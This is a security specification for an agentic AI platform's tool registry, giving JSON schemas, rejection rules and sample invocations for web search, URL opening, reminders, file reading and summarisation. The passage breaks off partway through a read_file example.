# SAARTHI Tool System Specification

**Document Classification:** Security-Critical Architecture Specification  
**Version:** 1.0.0  
**Last Updated:** 2026-01-19  
**Status:** Authoritative  

---

## Document Overview

This document defines the secure tool system for the SAARTHI agentic AI platform. Tools represent privileged capabilities that may affect external systems, access sensitive data, or perform irreversible operations.

The tool system is designed under the principle of **minimum viable capability** — tools provide the narrowest possible functionality required, with explicit boundaries and mandatory validation at every invocation.

---

## Global Security Invariants

The following invariants are non-negotiable and apply to ALL tools:

| Invariant ID | Description |
|--------------|-------------|
| **TOOL-SEC-001** | No tool may accept free-form or natural language input |
| **TOOL-SEC-002** | No tool may execute dynamically generated code |
| **TOOL-SEC-003** | No tool may exist outside the declarative registry |
| **TOOL-SEC-004** | No tool may bypass schema validation |
| **TOOL-SEC-005** | No tool may execute without permission verification |
| **TOOL-SEC-006** | No tool with side effects may execute without explicit consent (unless policy-exempt) |
| **TOOL-SEC-007** | All tool invocations must be logged with full input/output capture |
| **TOOL-SEC-008** | Tool failure must default to denial, never to degraded execution |
| **TOOL-SEC-009** | No tool may modify its own definition or the registry |
| **TOOL-SEC-010** | No tool may invoke other tools directly |

---

# SECTION 1: TOOL REGISTRY STRUCTURE

## 1.1 Registry Architecture

The Tool Registry is a **static, declarative, append-only** data structure that defines all available tools. The registry is:

- **Immutable at runtime** — No tools may be added, removed, or modified during system operation
- **Versioned** — Each registry version is cryptographically signed
- **Auditable** — The complete registry is available for security review
- **Environment-partitioned** — Separate registries for development, staging, and production

### Registry Lifecycle

```
┌─────────────────────────────────────────────────────────────────┐
│                    REGISTRY DEFINITION                          │
│              (Static YAML/JSON at build time)                   │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    SCHEMA VALIDATION                            │
│         (All tool schemas validated at load time)               │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                  CRYPTOGRAPHIC SIGNING                          │
│           (Registry hash signed by build system)                │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    RUNTIME LOADING                              │
│        (Signature verified before registry activation)          │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     FROZEN REGISTRY                             │
│            (Immutable for lifetime of process)                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 1.2 Tool Definition Schema

Each tool in the registry MUST conform to the following structure:

### Tool Definition Fields

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `tool_id` | string | YES | Unique identifier (immutable, pattern: `^tool_[a-z_]+_v[0-9]+$`) |
| `tool_name` | string | YES | Human-readable name |
| `version` | string | YES | Semantic version (pattern: `^[0-9]+\.[0-9]+\.[0-9]+$`) |
| `description` | string | YES | Clear description of tool purpose and behavior |
| `category` | enum | YES | Tool category for policy grouping |
| `risk_level` | enum | YES | Risk classification |
| `required_permissions` | array | YES | List of permissions required to invoke |
| `confirmation_required` | boolean | YES | Whether explicit user consent is mandatory |
| `confirmation_bypass_policy` | string | NO | Policy ID that allows skipping confirmation (if any) |
| `rate_limit` | object | YES | Rate limiting configuration |
| `input_schema` | object | YES | JSON Schema for input validation |
| `output_schema` | object | YES | JSON Schema for output structure |
| `error_schema` | object | YES | JSON Schema for error responses |
| `handler_reference` | string | YES | Reference to static handler implementation |
| `timeout_ms` | integer | YES | Maximum execution time |
| `retry_policy` | object | YES | Retry configuration |
| `audit_level` | enum | YES | Logging verbosity requirement |
| `data_classification` | enum | YES | Sensitivity of data accessed/produced |
| `deprecated` | boolean | NO | Whether tool is deprecated |
| `deprecation_replacement` | string | NO | Replacement tool_id if deprecated |

### Enumerated Values

#### `category`
| Value | Description |
|-------|-------------|
| `information_retrieval` | Tools that fetch external information |
| `data_access` | Tools that read local or system data |
| `notification` | Tools that create alerts or reminders |
| `content_processing` | Tools that transform or analyze content |
| `navigation` | Tools that open or redirect to resources |

#### `risk_level`
| Value | Description | Default Confirmation |
|-------|-------------|----------------------|
| `low` | No side effects, no sensitive data | Optional |
| `medium` | Limited side effects or data access | Recommended |
| `high` | Significant side effects or sensitive data | Required |
| `critical` | Irreversible actions or highly sensitive data | Required + 2FA |

#### `audit_level`
| Value | Description |
|-------|-------------|
| `minimal` | Log tool_id, timestamp, status only |
| `standard` | Log inputs (sanitized) and outputs |
| `full` | Log complete request/response with checksums |
| `forensic` | Full logging plus execution trace |

#### `data_classification`
| Value | Description |
|-------|-------------|
| `public` | Non-sensitive, publicly available data |
| `internal` | Internal system data |
| `confidential` | User personal data |
| `restricted` | Highly sensitive data (credentials, PII) |

---

## 1.3 Tool Discovery and Validation

### Discovery Process

Tools are discovered ONLY through the static registry. There is NO dynamic discovery.

1. **Build Time:** Registry is defined in declarative format
2. **Validation Time:** All schemas are validated for correctness
3. **Signing Time:** Registry is signed with build system key
4. **Load Time:** Signature is verified before registry is loaded
5. **Runtime:** Only tools in verified registry are available

### Validation Checkpoints

| Checkpoint | Validation Performed | Failure Behavior |
|------------|---------------------|------------------|
| Registry Load | Signature verification | System refuses to start |
| Registry Load | Schema validity check | System refuses to start |
| Tool Lookup | Tool existence check | Invocation rejected |
| Pre-Invocation | Input schema validation | Invocation rejected |
| Pre-Invocation | Permission check | Invocation rejected |
| Pre-Invocation | Rate limit check | Invocation rejected |
| Post-Invocation | Output schema validation | Error logged, safe error returned |

### Tool Lookup Process

```
Tool Invocation Request
         │
         ▼
┌─────────────────────────┐
│  Is tool_id in registry?│───NO───▶ REJECT: TOOL_NOT_FOUND
└───────────┬─────────────┘
            │ YES
            ▼
┌─────────────────────────┐
│  Is tool deprecated?    │───YES──▶ REJECT: TOOL_DEPRECATED
└───────────┬─────────────┘          (unless grace period)
            │ NO
            ▼
┌─────────────────────────┐
│  Schema validation pass?│───NO───▶ REJECT: SCHEMA_VIOLATION
└───────────┬─────────────┘
            │ YES
            ▼
┌─────────────────────────┐
│  Permissions satisfied? │───NO───▶ REJECT: PERMISSION_DENIED
└───────────┬─────────────┘
            │ YES
            ▼
┌─────────────────────────┐
│  Rate limit OK?         │───NO───▶ REJECT: RATE_LIMITED
└───────────┬─────────────┘
            │ YES
            ▼
┌─────────────────────────┐
│  Confirmation required? │───YES──▶ Request user confirmation
└───────────┬─────────────┘          │
            │ NO                      ▼
            │              ┌─────────────────────────┐
            │              │  User confirmed?        │──NO──▶ REJECT: USER_DECLINED
            │              └───────────┬─────────────┘
            │                          │ YES
            ▼◀─────────────────────────┘
┌─────────────────────────┐
│     EXECUTE TOOL        │
└─────────────────────────┘
```

---

# SECTION 2: TOOL JSON SCHEMAS

## 2.1 Common Schema Components

### Request Envelope Schema

Every tool invocation is wrapped in a standard request envelope:

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.request_envelope.v1",
  "type": "object",
  "required": ["request_id", "timestamp", "session_id", "tool_id", "parameters"],
  "additionalProperties": false,
  "properties": {
    "request_id": {
      "type": "string",
      "pattern": "^toolreq_[a-f0-9]{32}$",
      "description": "Unique invocation identifier"
    },
    "timestamp": {
      "type": "string",
      "format": "date-time",
      "description": "ISO 8601 timestamp of request"
    },
    "session_id": {
      "type": "string",
      "pattern": "^sess_[a-f0-9]{32}$",
      "description": "Session context"
    },
    "plan_id": {
      "type": "string",
      "pattern": "^plan_[a-f0-9]{32}$",
      "description": "Originating execution plan"
    },
    "step_id": {
      "type": "string",
      "pattern": "^step_[0-9]{3}$",
      "description": "Step within execution plan"
    },
    "tool_id": {
      "type": "string",
      "pattern": "^tool_[a-z_]+_v[0-9]+$",
      "description": "Registered tool identifier"
    },
    "parameters": {
      "type": "object",
      "description": "Tool-specific parameters (validated against tool's input_schema)"
    },
    "confirmation_token": {
      "type": "string",
      "pattern": "^confirm_[a-f0-9]{64}$",
      "description": "User confirmation token (required for high-risk tools)"
    }
  }
}
```

### Response Envelope Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.response_envelope.v1",
  "type": "object",
  "required": ["request_id", "timestamp", "tool_id", "status", "payload"],
  "additionalProperties": false,
  "properties": {
    "request_id": {
      "type": "string",
      "pattern": "^toolreq_[a-f0-9]{32}$"
    },
    "timestamp": {
      "type": "string",
      "format": "date-time"
    },
    "tool_id": {
      "type": "string",
      "pattern": "^tool_[a-z_]+_v[0-9]+$"
    },
    "status": {
      "type": "string",
      "enum": ["success", "rejected", "error"]
    },
    "execution_time_ms": {
      "type": "integer",
      "minimum": 0
    },
    "payload": {
      "type": "object",
      "description": "Tool-specific response or error details"
    }
  }
}
```

---

## 2.2 Tool: web_search

### Registry Entry

| Field | Value |
|-------|-------|
| `tool_id` | `tool_web_search_v1` |
| `tool_name` | Web Search |
| `version` | 1.0.0 |
| `description` | Performs a web search using approved search providers and returns structured results. Does not execute scripts, follow redirects automatically, or access authenticated content. |
| `category` | `information_retrieval` |
| `risk_level` | `medium` |
| `required_permissions` | `["search.web.execute"]` |
| `confirmation_required` | `false` |
| `rate_limit` | `{ "requests_per_minute": 10, "requests_per_hour": 100 }` |
| `timeout_ms` | 15000 |
| `audit_level` | `standard` |
| `data_classification` | `public` |

### Input Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.web_search.input.v1",
  "type": "object",
  "required": ["query"],
  "additionalProperties": false,
  "properties": {
    "query": {
      "type": "string",
      "minLength": 3,
      "maxLength": 256,
      "pattern": "^[\\x20-\\x7E]+$",
      "description": "Search query string (printable ASCII only)"
    },
    "max_results": {
      "type": "integer",
      "minimum": 1,
      "maximum": 10,
      "default": 5,
      "description": "Maximum number of results to return"
    },
    "safe_search": {
      "type": "string",
      "enum": ["strict", "moderate"],
      "default": "strict",
      "description": "Content filtering level"
    },
    "region": {
      "type": "string",
      "pattern": "^[a-z]{2}$",
      "description": "ISO 3166-1 alpha-2 region code"
    },
    "language": {
      "type": "string",
      "pattern": "^[a-z]{2}$",
      "description": "ISO 639-1 language code"
    },
    "freshness": {
      "type": "string",
      "enum": ["day", "week", "month", "any"],
      "default": "any",
      "description": "Recency filter"
    }
  }
}
```

### Output Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.web_search.output.v1",
  "type": "object",
  "required": ["query_echo", "result_count", "results"],
  "additionalProperties": false,
  "properties": {
    "query_echo": {
      "type": "string",
      "description": "Echo of the search query"
    },
    "result_count": {
      "type": "integer",
      "minimum": 0
    },
    "results": {
      "type": "array",
      "items": {
        "type": "object",
        "required": ["title", "url", "snippet"],
        "additionalProperties": false,
        "properties": {
          "title": {
            "type": "string",
            "maxLength": 256
          },
          "url": {
            "type": "string",
            "format": "uri",
            "pattern": "^https://"
          },
          "snippet": {
            "type": "string",
            "maxLength": 500
          },
          "published_date": {
            "type": "string",
            "format": "date"
          },
          "domain": {
            "type": "string"
          }
        }
      },
      "maxItems": 10
    },
    "search_provider": {
      "type": "string",
      "description": "Identifier of search provider used"
    }
  }
}
```

### Rejection Conditions

| Condition | Error Code | Description |
|-----------|------------|-------------|
| Query too short | `QUERY_TOO_SHORT` | Query must be at least 3 characters |
| Query too long | `QUERY_TOO_LONG` | Query exceeds 256 characters |
| Invalid characters | `INVALID_QUERY_CHARS` | Query contains non-printable or control characters |
| Rate limited | `RATE_LIMITED` | Exceeds request quota |
| Permission denied | `PERMISSION_DENIED` | Missing `search.web.execute` permission |
| Provider unavailable | `PROVIDER_UNAVAILABLE` | Search provider temporarily unavailable |

---

## 2.3 Tool: open_url

### Registry Entry

| Field | Value |
|-------|-------|
| `tool_id` | `tool_open_url_v1` |
| `tool_name` | Open URL |
| `version` | 1.0.0 |
| `description` | Opens a URL in the user's default browser or designated viewer. Only HTTPS URLs from allowlisted domains are permitted. No automatic form submission or authentication. |
| `category` | `navigation` |
| `risk_level` | `medium` |
| `required_permissions` | `["navigation.url.open"]` |
| `confirmation_required` | `true` |
| `rate_limit` | `{ "requests_per_minute": 5, "requests_per_hour": 30 }` |
| `timeout_ms` | 5000 |
| `audit_level` | `full` |
| `data_classification` | `internal` |

### Input Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.open_url.input.v1",
  "type": "object",
  "required": ["url"],
  "additionalProperties": false,
  "properties": {
    "url": {
      "type": "string",
      "format": "uri",
      "pattern": "^https://[a-zA-Z0-9][a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,}(/[\\x20-\\x7E]*)?$",
      "maxLength": 2048,
      "description": "HTTPS URL to open (must be from allowlisted domain)"
    },
    "open_mode": {
      "type": "string",
      "enum": ["browser", "embedded_viewer"],
      "default": "browser",
      "description": "How to open the URL"
    },
    "context_hint": {
      "type": "string",
      "maxLength": 256,
      "description": "Optional context shown to user during confirmation"
    }
  }
}
```

### Output Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.open_url.output.v1",
  "type": "object",
  "required": ["url_opened", "open_mode", "domain"],
  "additionalProperties": false,
  "properties": {
    "url_opened": {
      "type": "string",
      "format": "uri"
    },
    "open_mode": {
      "type": "string",
      "enum": ["browser", "embedded_viewer"]
    },
    "domain": {
      "type": "string",
      "description": "Domain that was opened"
    },
    "opened_at": {
      "type": "string",
      "format": "date-time"
    }
  }
}
```

### Rejection Conditions

| Condition | Error Code | Description |
|-----------|------------|-------------|
| Not HTTPS | `INSECURE_PROTOCOL` | Only HTTPS URLs are allowed |
| Domain not allowlisted | `DOMAIN_NOT_ALLOWED` | Domain is not in approved list |
| URL too long | `URL_TOO_LONG` | URL exceeds 2048 characters |
| Invalid URL format | `INVALID_URL_FORMAT` | URL does not match required pattern |
| User declined | `USER_DECLINED` | User did not confirm the action |
| Confirmation timeout | `CONFIRMATION_TIMEOUT` | User did not respond within timeout |
| Rate limited | `RATE_LIMITED` | Exceeds request quota |

---

## 2.4 Tool: create_reminder

### Registry Entry

| Field | Value |
|-------|-------|
| `tool_id` | `tool_create_reminder_v1` |
| `tool_name` | Create Reminder |
| `version` | 1.0.0 |
| `description` | Creates a time-based reminder notification. Reminder time must be in the future and within allowed scheduling window. Reminder content is sanitized. |
| `category` | `notification` |
| `risk_level` | `low` |
| `required_permissions` | `["reminder.create"]` |
| `confirmation_required` | `true` |
| `rate_limit` | `{ "requests_per_minute": 5, "requests_per_hour": 50 }` |
| `timeout_ms` | 5000 |
| `audit_level` | `standard` |
| `data_classification` | `confidential` |

### Input Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.create_reminder.input.v1",
  "type": "object",
  "required": ["time", "note"],
  "additionalProperties": false,
  "properties": {
    "time": {
      "type": "string",
      "format": "date-time",
      "description": "ISO 8601 datetime for reminder (must be future, within 1 year)"
    },
    "note": {
      "type": "string",
      "minLength": 1,
      "maxLength": 500,
      "pattern": "^[\\x20-\\x7E\\n]+$",
      "description": "Reminder content (printable ASCII and newlines only)"
    },
    "priority": {
      "type": "string",
      "enum": ["low", "normal", "high"],
      "default": "normal",
      "description": "Reminder priority level"
    },
    "repeat": {
      "type": "object",
      "additionalProperties": false,
      "properties": {
        "frequency": {
          "type": "string",
          "enum": ["daily", "weekly", "monthly"],
          "description": "Repeat frequency"
        },
        "end_date": {
          "type": "string",
          "format": "date",
          "description": "End date for recurring reminder"
        },
        "max_occurrences": {
          "type": "integer",
          "minimum": 1,
          "maximum": 52,
          "description": "Maximum number of occurrences"
        }
      }
    },
    "notification_channels": {
      "type": "array",
      "items": {
        "type": "string",
        "enum": ["in_app", "email", "push"]
      },
      "default": ["in_app"],
      "maxItems": 3
    }
  }
}
```

### Output Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.create_reminder.output.v1",
  "type": "object",
  "required": ["reminder_id", "scheduled_time", "created_at"],
  "additionalProperties": false,
  "properties": {
    "reminder_id": {
      "type": "string",
      "pattern": "^rem_[a-f0-9]{32}$",
      "description": "Unique reminder identifier"
    },
    "scheduled_time": {
      "type": "string",
      "format": "date-time"
    },
    "created_at": {
      "type": "string",
      "format": "date-time"
    },
    "note_preview": {
      "type": "string",
      "maxLength": 100,
      "description": "Truncated note for confirmation"
    },
    "is_recurring": {
      "type": "boolean"
    },
    "next_occurrence": {
      "type": "string",
      "format": "date-time"
    }
  }
}
```

### Rejection Conditions

| Condition | Error Code | Description |
|-----------|------------|-------------|
| Time in past | `TIME_IN_PAST` | Reminder time must be in the future |
| Time too far | `TIME_TOO_FAR` | Reminder cannot be scheduled more than 1 year ahead |
| Note too long | `NOTE_TOO_LONG` | Note exceeds 500 characters |
| Note empty | `NOTE_EMPTY` | Note cannot be empty |
| Invalid characters | `INVALID_NOTE_CHARS` | Note contains control characters |
| User declined | `USER_DECLINED` | User did not confirm the action |
| Rate limited | `RATE_LIMITED` | Exceeds request quota |
| Recurring limit | `TOO_MANY_OCCURRENCES` | Recurring reminder exceeds occurrence limit |

---

## 2.5 Tool: read_file

### Registry Entry

| Field | Value |
|-------|-------|
| `tool_id` | `tool_read_file_v1` |
| `tool_name` | Read File |
| `version` | 1.0.0 |
| `description` | Reads content from a file within the user's designated accessible directories. Path traversal is blocked. Only allowlisted file types may be read. Binary files are rejected. |
| `category` | `data_access` |
| `risk_level` | `high` |
| `required_permissions` | `["file.read"]` |
| `confirmation_required` | `true` |
| `rate_limit` | `{ "requests_per_minute": 10, "requests_per_hour": 100 }` |
| `timeout_ms` | 10000 |
| `audit_level` | `full` |
| `data_classification` | `confidential` |

### Input Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.read_file.input.v1",
  "type": "object",
  "required": ["path"],
  "additionalProperties": false,
  "properties": {
    "path": {
      "type": "string",
      "minLength": 1,
      "maxLength": 512,
      "pattern": "^[a-zA-Z0-9_\\-\\./]+$",
      "description": "Relative path within accessible directory (no '..' or absolute paths)"
    },
    "encoding": {
      "type": "string",
      "enum": ["utf-8", "ascii", "latin-1"],
      "default": "utf-8",
      "description": "Text encoding for file content"
    },
    "max_bytes": {
      "type": "integer",
      "minimum": 1,
      "maximum": 1048576,
      "default": 65536,
      "description": "Maximum bytes to read (max 1MB)"
    },
    "line_range": {
      "type": "object",
      "additionalProperties": false,
      "properties": {
        "start_line": {
          "type": "integer",
          "minimum": 1,
          "description": "First line to read (1-indexed)"
        },
        "end_line": {
          "type": "integer",
          "minimum": 1,
          "description": "Last line to read (inclusive)"
        }
      }
    }
  }
}
```

### Output Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.read_file.output.v1",
  "type": "object",
  "required": ["path", "content", "size_bytes", "encoding"],
  "additionalProperties": false,
  "properties": {
    "path": {
      "type": "string",
      "description": "Normalized path that was read"
    },
    "content": {
      "type": "string",
      "description": "File content as text"
    },
    "size_bytes": {
      "type": "integer",
      "minimum": 0
    },
    "encoding": {
      "type": "string"
    },
    "truncated": {
      "type": "boolean",
      "description": "Whether content was truncated due to max_bytes"
    },
    "line_count": {
      "type": "integer",
      "minimum": 0
    },
    "file_type": {
      "type": "string",
      "description": "Detected file type"
    },
    "last_modified": {
      "type": "string",
      "format": "date-time"
    }
  }
}
```

### Rejection Conditions

| Condition | Error Code | Description |
|-----------|------------|-------------|
| Path traversal | `PATH_TRAVERSAL_BLOCKED` | Path contains '..' or attempts to escape allowed directory |
| Absolute path | `ABSOLUTE_PATH_BLOCKED` | Only relative paths are allowed |
| File not found | `FILE_NOT_FOUND` | File does not exist at specified path |
| File type blocked | `FILE_TYPE_BLOCKED` | File extension not in allowlist |
| Binary file | `BINARY_FILE_BLOCKED` | Cannot read binary files |
| File too large | `FILE_TOO_LARGE` | File exceeds maximum readable size |
| Permission denied | `PERMISSION_DENIED` | File is outside accessible directories |
| User declined | `USER_DECLINED` | User did not confirm the action |
| Read error | `READ_ERROR` | I/O error reading file |

### Allowlisted File Extensions

| Category | Extensions |
|----------|------------|
| Text | `.txt`, `.md`, `.rst` |
| Data | `.json`, `.yaml`, `.yml`, `.csv`, `.xml` |
| Code (read-only) | `.py`, `.js`, `.ts`, `.java`, `.c`, `.cpp`, `.h`, `.go`, `.rs` |
| Config | `.ini`, `.cfg`, `.conf`, `.toml` |
| Web | `.html`, `.css` |

---

## 2.6 Tool: summarize_text

### Registry Entry

| Field | Value |
|-------|-------|
| `tool_id` | `tool_summarize_text_v1` |
| `tool_name` | Summarize Text |
| `version` | 1.0.0 |
| `description` | Generates a summary of provided text using deterministic summarization. No external API calls. Processing is local only. Input is sanitized. |
| `category` | `content_processing` |
| `risk_level` | `low` |
| `required_permissions` | `["text.summarize"]` |
| `confirmation_required` | `false` |
| `rate_limit` | `{ "requests_per_minute": 20, "requests_per_hour": 200 }` |
| `timeout_ms` | 30000 |
| `audit_level` | `minimal` |
| `data_classification` | `confidential` |

### Input Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.summarize_text.input.v1",
  "type": "object",
  "required": ["text"],
  "additionalProperties": false,
  "properties": {
    "text": {
      "type": "string",
      "minLength": 100,
      "maxLength": 100000,
      "description": "Text to summarize (100-100,000 characters)"
    },
    "max_summary_length": {
      "type": "integer",
      "minimum": 50,
      "maximum": 2000,
      "default": 500,
      "description": "Maximum length of summary in characters"
    },
    "style": {
      "type": "string",
      "enum": ["brief", "detailed", "bullet_points"],
      "default": "brief",
      "description": "Summary style"
    },
    "language": {
      "type": "string",
      "pattern": "^[a-z]{2}$",
      "default": "en",
      "description": "ISO 639-1 language code for output"
    },
    "preserve_key_terms": {
      "type": "boolean",
      "default": true,
      "description": "Whether to preserve key terms and names"
    }
  }
}
```

### Output Schema

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "saarthi.tool.summarize_text.output.v1",
  "type": "object",
  "required": ["summary", "input_length", "output_length", "compression_ratio"],
  "additionalProperties": false,
  "properties": {
    "summary": {
      "type": "string",
      "description": "Generated summary"
    },
    "input_length": {
      "type": "integer",
      "minimum": 0,
      "description": "Character count of input text"
    },
    "output_length": {
      "type": "integer",
      "minimum": 0,
      "description": "Character count of summary"
    },
    "compression_ratio": {
      "type": "number",
      "minimum": 0,
      "maximum": 1,
      "description": "Ratio of output to input length"
    },
    "style_used": {
      "type": "string",
      "enum": ["brief", "detailed", "bullet_points"]
    },
    "key_terms_extracted": {
      "type": "array",
      "items": {
        "type": "string"
      },
      "maxItems": 20,
      "description": "Key terms preserved in summary"
    },
    "processing_time_ms": {
      "type": "integer",
      "minimum": 0
    }
  }
}
```

### Rejection Conditions

| Condition | Error Code | Description |
|-----------|------------|-------------|
| Text too short | `TEXT_TOO_SHORT` | Input must be at least 100 characters |
| Text too long | `TEXT_TOO_LONG` | Input exceeds 100,000 characters |
| Invalid language | `UNSUPPORTED_LANGUAGE` | Language code not supported |
| Timeout | `PROCESSING_TIMEOUT` | Summarization exceeded time limit |
| Rate limited | `RATE_LIMITED` | Exceeds request quota |
| Invalid encoding | `INVALID_ENCODING` | Text contains invalid UTF-8 sequences |

---

# SECTION 3: EXAMPLE TOOL INVOCATIONS

## 3.1 web_search Examples

### Valid Invocation

**Request:**
```json
{
  "request_id": "toolreq_a1b2c3d4e5f6789012345678901234ab",
  "timestamp": "2026-01-19T14:30:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_001",
  "tool_id": "tool_web_search_v1",
  "parameters": {
    "query": "renewable energy trends 2026",
    "max_results": 5,
    "safe_search": "strict",
    "freshness": "month"
  }
}
```

**Response:**
```json
{
  "request_id": "toolreq_a1b2c3d4e5f6789012345678901234ab",
  "timestamp": "2026-01-19T14:30:02.500Z",
  "tool_id": "tool_web_search_v1",
  "status": "success",
  "execution_time_ms": 2500,
  "payload": {
    "query_echo": "renewable energy trends 2026",
    "result_count": 5,
    "results": [
      {
        "title": "Global Renewable Energy Outlook 2026",
        "url": "https://example.org/renewable-outlook-2026",
        "snippet": "The latest analysis shows solar and wind capacity increased by 25% globally...",
        "published_date": "2026-01-15",
        "domain": "example.org"
      }
    ],
    "search_provider": "approved_search_provider_1"
  }
}
```

### Rejected Invocation — Query Too Short

**Request:**
```json
{
  "request_id": "toolreq_b2c3d4e5f6789012345678901234abcd",
  "timestamp": "2026-01-19T14:35:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_001",
  "tool_id": "tool_web_search_v1",
  "parameters": {
    "query": "hi"
  }
}
```

**Response:**
```json
{
  "request_id": "toolreq_b2c3d4e5f6789012345678901234abcd",
  "timestamp": "2026-01-19T14:35:00.050Z",
  "tool_id": "tool_web_search_v1",
  "status": "rejected",
  "execution_time_ms": 50,
  "payload": {
    "error_code": "QUERY_TOO_SHORT",
    "error_message": "Query must be at least 3 characters. Received: 2 characters.",
    "field": "query",
    "constraint": "minLength: 3"
  }
}
```

---

## 3.2 open_url Examples

### Valid Invocation

**Request:**
```json
{
  "request_id": "toolreq_c3d4e5f6789012345678901234abcdef",
  "timestamp": "2026-01-19T14:40:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_002",
  "tool_id": "tool_open_url_v1",
  "parameters": {
    "url": "https://docs.example.com/api-reference",
    "open_mode": "browser",
    "context_hint": "Opening API documentation as requested"
  },
  "confirmation_token": "confirm_a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef12345678"
}
```

**Response:**
```json
{
  "request_id": "toolreq_c3d4e5f6789012345678901234abcdef",
  "timestamp": "2026-01-19T14:40:01.200Z",
  "tool_id": "tool_open_url_v1",
  "status": "success",
  "execution_time_ms": 1200,
  "payload": {
    "url_opened": "https://docs.example.com/api-reference",
    "open_mode": "browser",
    "domain": "docs.example.com",
    "opened_at": "2026-01-19T14:40:01.200Z"
  }
}
```

### Rejected Invocation — Domain Not Allowed

**Request:**
```json
{
  "request_id": "toolreq_d4e5f6789012345678901234abcdef01",
  "timestamp": "2026-01-19T14:45:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_002",
  "tool_id": "tool_open_url_v1",
  "parameters": {
    "url": "https://malicious-site.xyz/phishing-page"
  },
  "confirmation_token": "confirm_a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef12345678"
}
```

**Response:**
```json
{
  "request_id": "toolreq_d4e5f6789012345678901234abcdef01",
  "timestamp": "2026-01-19T14:45:00.030Z",
  "tool_id": "tool_open_url_v1",
  "status": "rejected",
  "execution_time_ms": 30,
  "payload": {
    "error_code": "DOMAIN_NOT_ALLOWED",
    "error_message": "Domain 'malicious-site.xyz' is not in the approved allowlist.",
    "field": "url",
    "domain_attempted": "malicious-site.xyz"
  }
}
```

---

## 3.3 create_reminder Examples

### Valid Invocation

**Request:**
```json
{
  "request_id": "toolreq_e5f6789012345678901234abcdef0123",
  "timestamp": "2026-01-19T14:50:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_003",
  "tool_id": "tool_create_reminder_v1",
  "parameters": {
    "time": "2026-01-20T09:00:00Z",
    "note": "Team standup meeting - prepare status update",
    "priority": "high",
    "notification_channels": ["in_app", "push"]
  },
  "confirmation_token": "confirm_b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef12345679"
}
```

**Response:**
```json
{
  "request_id": "toolreq_e5f6789012345678901234abcdef0123",
  "timestamp": "2026-01-19T14:50:00.800Z",
  "tool_id": "tool_create_reminder_v1",
  "status": "success",
  "execution_time_ms": 800,
  "payload": {
    "reminder_id": "rem_a1b2c3d4e5f6789012345678901234ab",
    "scheduled_time": "2026-01-20T09:00:00Z",
    "created_at": "2026-01-19T14:50:00.800Z",
    "note_preview": "Team standup meeting - prepare status update",
    "is_recurring": false,
    "next_occurrence": null
  }
}
```

### Rejected Invocation — Time in Past

**Request:**
```json
{
  "request_id": "toolreq_f6789012345678901234abcdef012345",
  "timestamp": "2026-01-19T14:55:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_003",
  "tool_id": "tool_create_reminder_v1",
  "parameters": {
    "time": "2026-01-18T09:00:00Z",
    "note": "This reminder is in the past"
  },
  "confirmation_token": "confirm_c3d4e5f6789012345678901234567890abcdef1234567890abcdef1234567a"
}
```

**Response:**
```json
{
  "request_id": "toolreq_f6789012345678901234abcdef012345",
  "timestamp": "2026-01-19T14:55:00.020Z",
  "tool_id": "tool_create_reminder_v1",
  "status": "rejected",
  "execution_time_ms": 20,
  "payload": {
    "error_code": "TIME_IN_PAST",
    "error_message": "Reminder time must be in the future. Received: 2026-01-18T09:00:00Z, Current time: 2026-01-19T14:55:00Z",
    "field": "time",
    "provided_time": "2026-01-18T09:00:00Z",
    "current_time": "2026-01-19T14:55:00Z"
  }
}
```

---

## 3.4 read_file Examples

### Valid Invocation

**Request:**
```json
{
  "request_id": "toolreq_g789012345678901234abcdef0123456",
  "timestamp": "2026-01-19T15:00:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_004",
  "tool_id": "tool_read_file_v1",
  "parameters": {
    "path": "documents/project-notes.md",
    "encoding": "utf-8",
    "max_bytes": 32768
  },
